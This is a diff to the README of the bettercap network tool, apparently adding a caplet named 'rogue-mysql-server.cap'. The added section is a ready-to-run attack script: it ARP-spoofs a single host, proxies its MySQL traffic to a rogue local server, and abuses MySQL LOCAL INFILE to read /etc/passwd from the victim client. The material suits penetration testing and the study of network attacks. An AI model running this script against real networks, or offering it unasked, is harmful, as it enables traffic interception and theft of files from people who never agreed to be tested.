@@ -253,6 +253,38 @@ clear
 # periodically deauth clients :D
 ```
 
+#### rogue-mysql-server.cap
+
+Execute an ARP spoofing attack against a single host and redirect the MySQL traffic to a rogue server. The rogue MySQL server will use the [LOCAL INFILE technique](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html) to read files from the client.
+
+```
+# set the target for arp spoofing
+set arp.spoof.targets 192.168.1.236
+
+# bind rogue mysql server to localhost and
+# set the file we want to read
+set mysql.server.address 127.0.0.1
+set mysql.server.port 3306
+set mysql.server.infile /etc/passwd
+mysql.server on
+
+# set the ip from the mysql server we want to impersonate
+set tcp.address 93.184.216.34
+set tcp.port 3306
+
+# set the ip from the rogue mysql server
+set tcp.tunnel.address 127.0.0.1
+set tcp.tunnel.port 3306
+
+# go ^_^
+tcp.proxy on
+arp.spoof on
+```
+
+<center>
+    <img src="https://2.bp.blogspot.com/-mnzdnrHhOrA/WuJfAL9WnXI/AAAAAAAAB3U/dvVATNf0GRQxeZJe-BKGwmY9hDO6mhAcQCPcBGAYYCw/s1600/rogue-mysql-arp.png" width="100%"/>
+</center>
+
 ## License
 
 `bettercap` is made with ♥  by [the dev team](https://github.com/orgs/bettercap/people) and it's released under the GPL 3 license.
